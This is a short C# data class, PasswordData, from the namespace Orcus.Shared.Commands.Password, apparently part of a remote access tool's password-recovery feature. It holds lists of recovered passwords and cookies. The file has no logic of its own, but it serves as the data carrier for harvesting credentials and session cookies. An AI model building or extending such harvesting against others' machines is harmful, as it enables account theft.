using System;
using System.Collections.Generic;

namespace Orcus.Shared.Commands.Password
{
    [Serializable]
    public class PasswordData
    {
        public List<RecoveredPassword> Passwords { get; set; }
        public List<RecoveredCookie> Cookies { get; set; }
    }
}